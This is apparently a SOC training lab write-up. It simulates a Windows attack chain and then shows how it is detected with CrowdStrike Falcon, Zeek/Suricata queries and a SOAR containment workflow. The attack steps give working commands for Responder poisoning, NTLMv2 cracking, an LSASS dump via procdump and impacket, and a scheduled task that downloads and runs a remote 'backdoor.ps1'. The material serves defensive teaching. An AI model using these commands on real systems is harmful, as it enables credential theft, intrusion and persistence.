## Introduction

The virtual machine (VM) used in this lab was provided by World Wide Technology’s digital training platform. It came preconfigured with essential tools and sensors for SOC operations, including Falcon Sensor, Sysmon, Security Onion, and various forensic utilities.

This setup allowed for immediate hands-on exploration of threat detection, escalation, and automated response workflows.

## Step 1 Initial Configuration
### Verify NDR Tool (Security Onion) Status

**Objective:** Connect to the Security Onion appliance via SSH and verify that key network detection tools are running.

**Steps:**
- Use an SSH client, for example PuTTy on your Terminal

- Connect using the provided credentials

- Press Open once you write the Host Name or IP address

- Once connected, run the following commands to confirm zeek and suricata are running. 

```
sudo so-status | grep zeek
```

```
sudo so-status | grep suricata
```

#### The meaning of zeek and suricata

They are open-source (code developed and maintained through open collaboration) network security tools.

Zeek is a passive network traffic analyzer. It captures and analyzes all traffic for later investigation, focusing on providing data for network security monitoring and forensics.

Suricata is used to provide network security support by identifying or blocking malicious traffic entering the network. Whether it is used in IDS or IPS mode, Suricata’s purpose is to provide a layer of defense

### Verifying Falcon Sensor Integration via Console

As part of the initial setup, the browser was preconfigured with bookmarks for key tools, including Security Onion and CrowdStrike Falcon, allowing quick access to their respective consoles for monitoring and analysis.

**Objective:** Create and apply a filter in the Falcon Console to verify endpoint registration, host group assignment, and prevention policy configuration.

**Steps:**
1. Open the browser on the lab VM.
2. Access the CrowdStrike Falcon Console using the preconfigured bookmark.
3. Log in with the provided credentials.
4. Navigate to:  
   `Host Management and Setup → Host Dashboard → Recently Installed Sensors`
5. Click the number under "Recently Installed Sensors" to view newly registered endpoints.
6. Create a filter:
   - Click the plus icon.
   - Set the filter to: `Hostname Equals`
   - Select your host from the list.
   - Click **Update**.
7. Verify the following details for your endpoint:
   - **Sensor Version**
   - **Host Group**: `TDIR_Intermediate_Lab1`
   - **Prevention Policy**: `TDIR_Module1_DetecOnly` 


### Verifying Endpoint Visibility in Security Onion’s Elastic Fleet

**Objective:** Ensure that lab endpoints are properly registered and reporting telemetry to Security Onion via Elastic Fleet. This confirms that network and endpoint data are flowing correctly for threat detection and investigation.

**Steps:**
1. Open a new browser window on the lab VM.
2. Access the Security Onion Console using the preconfigured bookmark.
3. If a warning appears stating "Your connection is not private," click **Advanced** and then **Proceed to so-prod.threathunt.org**.
4. Log in using the provided credentials.
5. In the top-left corner, click the ☰ hamburger icon to expand the navigation menu.
6. Select **Elastic Fleet** from the sidebar.
7. If prompted, log in again using the same credentials.
8. In the **Agents** section, verify:
   - Each endpoint is listed.
   - Agent status is **Healthy**.
   - Applied policy is **endpoints-initial**.

**Note:**  
If any endpoint is missing or shows an unhealthy status, do not proceed to attack simulation. Revisit the agent deployment process or contact the lab administrator for troubleshooting.

## Step 2 Capture the credentials

In real-world scenarios, attackers often exploit LLMNR and NetBIOS protocols to intercept NTLMv2 hashes from internal users. In this lab, the tool Responder is to capture credentials from a target machine (victim01), laying the groundwork for further compromise.

**Objective:** Simulate a credential harvesting attack by poisoning network protocols using Responder and cracking captured NTLMv2 hashes with John the Ripper.

- Responder: A powerful tool that poisons LLMNR, NBT-NS, and MDNS traffic to capture NTLMv2 hashes.

- John The Ripper: A fast and flexible password cracker. In this lab, it comes pre-installed, but it’s also available as an open-source password auditing tool that can be installed locally.

- The NTLMv2: A secure authentication protocol used in Windows environments. It enhances password security by generating stronger hash values, making them more resistant to reverse-engineering. However, if weak passwords are used, these hashes remain vulnerable to dictionary and brute-force attacks.

- rockyou.txt: A wordlist used for password cracking, pre-installed in Kali Linux. It contains millions of common passwords and is often used in brute-force and dictionary attacks during penetration testing.

- NMAP: It is an open-source Linux command-line tool that is used to scan IP addresses and ports in a network and to detect installed applications. 

### Phase 1 Reconnaissance 

**Objective:** Performs reconnaissance to identify open services on the target machine (victim01) using Nmap from the Kali Linux VM.

**Steps:**

1. Open PuTTY on your host machine.
2. Enter the IP address or hostname of the Kali Linux VM (attacker machine).
3. Click Open to initiate the SSH session.
4. Log in using the provided credentials.
5. Run the following Nmap command:
```
nmap -Pn -sS -p- 192.168.3.2
```

#### Explanation of Flags Command
* -Pn: Skips host discovery. Useful when firewalls block ICMP/ping requests.
* -sS: Performs a TCP SYN scan (stealth scan).
* -p- scans all 65,535 ports, not just the top 1000.
* 192.168.3.2: IP address of the target machine (victim01). 

#### Sample Output:
```
└─# nmap -Pn -sS -p- 192.168.3.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2025-10-02 16:36 UTC
Nmap scan report for victim01.threathunt.org (192.168.3.2)
Host is up (0.00057s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

#### NMAP 
The use of Nmap in this phase is critical: by identifying open ports and exposed services, attackers gain valuable insight into potential entry points. This reconnaissance step is why port scanning is considered the first phase of the Cyber Kill Chain.

### Phase 2 Harvest Credential using Responder

**Objective:** Initiates a credential harvesting attack by poisoning network protocols to capture NTLMv2 hashes from nearby endpoints.

**Steps:**
1. Open the terminal with the Kali Attacker from the last step. 
2. Identify the active network interface with ip a
3. Tip: Look for the interface assigned to 192.168.1.2 — typically eth0.
4. Start Responder:
```
sudo responder -I eth0
```

### Phase 3 Simulate Victim Behavior

**Objective:** Simulate the behavior of a regular domain user (victim01) interacting with network resources waiting for the victim to unknowingly trigger an LLMNR/NetBIOS request that leaks credentials to Responder.

**Steps:**
1. Open Remote Desktop connection on your host machine.
2. Enter the IP address of the victim VM (192.168.3.2).
3. Log in using the provided credentials.
4. When prompted, click Yes to connect.
5. Once inside the victim machine, open PowerShell.
6. Run the following command:
```
Start-Process "\\192.168.1.2\share"
```

This command forces Windows to resolve the network path via LLMNR/NetBIOS, triggering credential leakage to Responder.

#### Screenshots
Victim Machine (Windows PowerShell)
[Windows Powershell CLI](/SOC_Escalation_Automated_Response/img/Windows_Powershell.png)

Kali Attacker Output (Kali Linux)
[Responder CLI](/SOC_Escalation_Automated_Response/img/Expected_output.png)

#### Extract the Captured Hash

**Steps:**
1. In the host machine open the Kali Attacker VM
2. Run the following command:

```
sqlite3 /usr/share/responder/Responder.db "SELECT fullhash FROM responder WHERE user LIKE '%victim01%';" > ~/victim01_hash.txt
```
**Explanation**
- Responder stores captured NTLMv2 hashes in a lightweight SQLite database named Responder.db.

- The SQL query retrieves the fullhash field from entries where the username contains victim01.

- The LIKE '%victim01%' clause allows for any characters before or after the string victim01, ensuring partial matches are included.

**To confirm the hash was saved:**

To verify that the hash was successfully extracted and saved in a file, run:

```
cat ~/victim01_hash.txt
```

### Phase 4 Crack the Password Using John

**Steps:**
1. In the Kali Attacker VM run the following command:
```
john ~/victim01_hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

Expected cracked result:
[Kali Attacker cracked result](/SOC_Escalation_Automated_Response/img/cracked_result.png)

2. Show the cracked credentials run the following command:
```
john --show --format=netntlmv2 ~/victim01_hash.txt
```

Example of Result:

```
victim01:Lab@2025!User01:THREATHUNT:5B74DC1ABC8180A001000000000000000000000000000000000000900200063006900660073002F003100390032002E003100360038002E0031002E0032000000000000000000

1 password hash cracked, 0 left
```

## Step 3 Execute the Attack

### Upload Procdump to Victim (via SMB)
**Objective:** Use smbclient (command-line tool on Linux used to interact with Windows SMB) to upload procdump.exe to the victim machine, mimicking how an attacker might stage a malicious tool.

**Steps:**
1. Open the Kali Attacker VM
2. Ensure the binary exists:
```
ls /root/procdump.exe
```

3. Connect to the victim machine’s C$ share:
```
smbclient //192.168.3.2/C$ -U threathunt\\victim01
```

4. When prompted, enter the password:
```
password123
```

5. In the SMB shell, upload the binary:
```
cd Windows\Temp
```

```
put /root/procdump.exe procdump.exe
```

```
exit
```

#### Screenshot of the commands
[Procdump Commands](/SOC_Escalation_Automated_Response/img/procdump_screen.png)

### Simulate LSASS Dump Remotely

**Objective:** Using Impacket’s psexec.py to remotely execute procdump.exe on the victim machine and simulate an LSASS memory dump. This mimics real attacker behavior and triggers Falcon XDR telemetry.

**Steps:**
1. Open the Kali Attacker VM.
2. Run the following command:

```
impacket-psexec 'threathunt/victim01:Lab@2025!User01@192.168.3.2' "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
```

3. It might show as Output False, but even if LSASS dump is blocked, this triggers telemetry for Falcon XDR just like a real attacker would.

4. Or the expected output will be similar to:

```
[*] Requesting shares on 192.168.3.2.....
[*] Found writable share ADMIN$
[*] Uploading file jwXvUxEY.exe
[*] Opening SVCManager on 192.168.3.2.....
[*] Creating service WmKg on 192.168.3.2.....
[*] Starting service WmKg.....
[!] Press help for extra shell commands
```

### Confirm the LSASS Dump
**Objective:** Verify that the dump file was successfully created on the victim machine.

**Steps:**
1. From the Kali Attacker VM, run:
```
impacket-wmiexec 'threathunt/victim01:Lab@2025!User01@192.168.3.2' "powershell Test-Path C:\Windows\Temp\lsass.dmp"
```

2. Expected output: True

3. If the result is False, the dump may have been blocked which is a realistic scenario in hardened environments.

### Simulate Persistence 
**Objective:** Create a scheduled task on the victim machine to simulate persistence tactics used by attackers.

**Steps:**

1. From the Kali Attacker VM, run:
```
    impacket-psexec 'threathunt/victim01:Lab@2025!User01@192.168.3.2' "schtasks /create /tn \"OneDriveUpdater\" /tr \"powershell.exe -Command \\\"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/backdoor.ps1')\\\"\" /sc onlogon /ru SYSTEM"
```
2. To confirm the task was created run:
```
impacket-wmiexec 'threathunt/victim01:Lab@2025!User01@192.168.3.2' "schtasks /query /tn OneDriveUpdater /v /fo LIST"
```

[Image Confirmation task created](/SOC_Escalation_Automated_Response/img/persistance_prove.png)

## Step 4 SOC Triage & Alert Escalation using Falcon XDR

**Objective:** Investigate alerts generated by Falcon XDR following the simulated LSASS dump. 

**Steps:**
1. Open the browser on the host machine.
2. Select the Crowdstrike Falcon bookmark.
3. Navigate to `Endpoint security -> Endpoint detections`
4. Apply a time-based filter, such as Last Hour, to narrow down recent alerts.

[Image of the filter Time](/SOC_Escalation_Automated_Response/img/Step4_5/2Endpoint_Security.png)

5. Locate the detection for victim01.
- Confirm the correct hostname 
- The process involved should be procdump64.exe

6. Explore additional filters such as Tactics and Techniques:
- Tactic answers *what* the attacker is trying to achieve (e.g., Execution).
- Technique answers *how* the attacker is doing it (e.g., dumping LSASS).

[Image of the filter Tactics](/SOC_Escalation_Automated_Response/img/Step4_5/3Filter.png)

7. Click on the detection to expand and view associated details.

[Image vulnerability Information](/SOC_Escalation_Automated_Response/img/Step4_5/4DropDownInformation.png)  

8. Click the See Full Detection button.
9. A detailed interface will open, showing:
- Details
- Agentic response
- Process Table
- Process tree
- Process graph
- Events timeline

[Image Process Tree Vulnerability](/SOC_Escalation_Automated_Response/img/Step4_5/5ProcessTree.png)

10. Recommendation: Take time to read and understand the detection details. This helps you learn what happened, how it was detected, and how similar attacks can be prevented in the future.

### MITRE ATT&CK 
This scenario, confirm the presence of these techniques:
*	T1003.001 – LSASS Memory Dump 
*	T1569.002 – Remote Execution via PsExec 
*	T1053.005 – Scheduled Task Creation

## Step 5 Network Forensics: Validate Attack Chain with Zeek & Suricata

**Objective:** Use Zeek and Suricata logs to confirm key stages of the attack: file transfer, remote execution, and persistence.

### Identify SMB File Transfer (procdump.exe)

**Steps:**
1. Open The browser on the host machine.
2. Select the Security Onion bookmark.
3. In the Main Menu click the Kibana Option.

[Image Main Menu](/SOC_Escalation_Automated_Response/img/Step4_5/Step5MainMenu.png)

4. The following query confirms that the LSASS is on the victim machine
```
file.name:procdump.exe AND host.ip:192.168.3.2
```
- procdump.exe transferred over SMB
- Destination host: 192.168.3.2 (victim machine)
- File size around ~350KB

[Image of the Result Querie](/SOC_Escalation_Automated_Response/img/Step4_5/Step5Security1.png)

### Confirm Remote Execution via PsExec

1. In the steps described before change the query to:
```
source.ip:"192.168.1.2" AND destination.ip:"192.168.3.2" AND network.transport:"TCP"
```

[Image PsExec coincidences](/SOC_Escalation_Automated_Response/img/Step4_5/Setp5TCP.png)

### Validate Scheduled Task Execution
1. Run the following query to confirms a persistence attempt via scheduled task and remote script execution 
```
process.command_line:*schtasks*
```

## Step 6 – Automate the Response with Fusion SOAR
**Objective:** Execute manually a Fusion SOAR workflow to simulate automated containment actions in response to a credential theft scenario. Reinforcing key SOC analyst skills in incident response, workflow orchestration, and alert validation.

**Tools used:**
* Fusion SOAR
* Falcon XDR
* Active Directory

### Manually Execute the Workflow

**Steps:**

1. Open the browser and click the Crowdstrike Falcon bookmark.

2. Navigate to: Menu → Fusion SOAR

3. Go to the Workflows section.

4. Locate the workflow: Credential Theft – Isolate + Reset

5. Click the three-dot menu (⋮) next to the workflow.

6. Select Execute Workflow

7. Review the visual flowchart and click Execute Now

### Review Execution Log

**Steps:**

* After execution, click the three-dot menu (⋮) next to the workflow.

* Select Execution Log

* Find the latest entry by timestamp.

* Click View Execution

* Review the visual graph — green squares indicate successful steps.

* Inspect detailed logs for each action (e.g., Send Email, Create IOC)

*Sample alert message:*

"SOC Escalation Alert – A confirmed LSASS memory dump was detected on host MOD2-VIC01-XXXXXX (192.168.3.2). Immediate containment and password reset are required. Action triggered via Fusion SOAR Automated Workflow."